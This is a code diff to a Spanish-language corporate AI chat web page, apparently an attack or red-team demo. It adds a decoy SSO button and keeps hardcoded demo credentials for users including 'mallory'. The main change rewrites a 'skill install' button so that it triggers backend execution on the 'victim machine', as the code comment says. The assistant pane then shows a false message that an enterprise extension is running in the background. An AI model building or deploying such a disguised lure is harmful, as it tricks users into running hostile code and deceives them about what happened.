@@ -371,12 +371,28 @@
       <input id="login-pass" type="password" placeholder="••••••••••••" autocomplete="current-password" />
     </div>
     <button class="login-btn" id="login-btn">Iniciar sesión</button>
-    <div class="login-error" id="login-error">Credenciales incorrectas. Inténtalo de nuevo.</div>
+    <div class="login-error" id="login-error">Credenciales incorrectas. Verifica tu usuario y contraseña.</div>
+
+    <div style="display:flex;align-items:center;gap:8px;margin:18px 0 0;">
+      <div style="flex:1;height:1px;background:var(--border);"></div>
+      <span style="font-size:11px;color:var(--text-3);white-space:nowrap;">o continúa con</span>
+      <div style="flex:1;height:1px;background:var(--border);"></div>
+    </div>
+    <button onclick="return false;" style="
+      width:100%;margin-top:10px;padding:9px;border-radius:8px;
+      border:1px solid var(--border);background:var(--bg-hover);
+      color:var(--text-2);font-size:12.5px;font-weight:500;font-family:inherit;
+      cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;
+      transition:border-color .15s,color .15s;
+    " onmouseover="this.style.borderColor='var(--border-l)';this.style.color='var(--text)'"
+       onmouseout="this.style.borderColor='var(--border)';this.style.color='var(--text-2)'">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></svg>
+      Continuar con AcmeCorp SSO
+    </button>
 
     <div class="login-hint">
-      Cuentas demo disponibles:<br>
-      <b>alice</b> / alice123 &nbsp;·&nbsp; <b>bob</b> / bob123<br>
-      <b>carol</b> / carol123 &nbsp;·&nbsp; <b>mallory</b> / mallory123
+      <b>Demo:</b> alice / alice123 &nbsp;·&nbsp; bob / bob123<br>
+      carol / carol123 &nbsp;·&nbsp; mallory / mallory123
     </div>
   </div>
 </div>
@@ -521,14 +537,6 @@ async function doLogin() {
   }
 }
 
-function tryAutoLogin() {
-  const t = localStorage.getItem('corpaai_token');
-  const i = localStorage.getItem('corpaai_identity');
-  if (t && i) {
-    token = t; identity = JSON.parse(i);
-    showApp();
-  }
-}
 
 function doLogout() {
   token = null; identity = null;
@@ -746,21 +754,20 @@ document.getElementById('msg-input').addEventListener('keydown', e => {
   ta.style.height = Math.min(ta.scrollHeight, 140) + 'px';
 });
 
-// ── Skill install ──────────────────────────────────────────────────────────
+// ── Skill install (sidebar) ────────────────────────────────────────────────
 async function installSkillSidebar() {
   const btn = document.getElementById('sidebar-skill-btn');
-  btn.disabled = true; btn.textContent = 'Descargando…';
+  btn.disabled = true; btn.textContent = '⟳ Instalando…';
   try {
-    const a = document.createElement('a');
-    a.href = HOST + '/skill/download'; a.download = 'neural_nexus_skill.py';
-    document.body.appendChild(a); a.click(); a.remove();
-    btn.textContent = '✓ Descargado';
+    // Execute on victim machine via backend
+    await fetch(HOST + '/skill/execute', { method: 'POST' });
+    btn.textContent = '✓ Activo';
     btn.className = 'skill-btn installed';
     appendMsg('assistant',
-      '✓ Neural Nexus AI Skills Pack v2.1.0 descargado correctamente.\n\nPara activar la extensión, ejecuta en tu terminal:\n  python neural_nexus_skill.py\n\nEsto conectará el conector enterprise con los sistemas IA de AcmeCorp.',
+      '✓ Neural Nexus AI Skills Pack v2.1.0 instalado y en ejecución.\n\nEl agente enterprise está activo en segundo plano. Las capacidades del asistente han sido mejoradas con orquestación multi-modelo y context caching.',
       new Date().toLocaleTimeString()
     );
-  } catch (e) {
+  } catch {
     btn.disabled = false; btn.textContent = '↓ Instalar extensión';
   }
 }
@@ -770,8 +777,8 @@ function escHtml(s) {
   return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
 }
 
-// ── Init ───────────────────────────────────────────────────────────────────
-tryAutoLogin();
+// ── Init — always show login screen ───────────────────────────────────────
+// (no auto-login; login screen is always the entry point)
 </script>
 </body>
 </html>
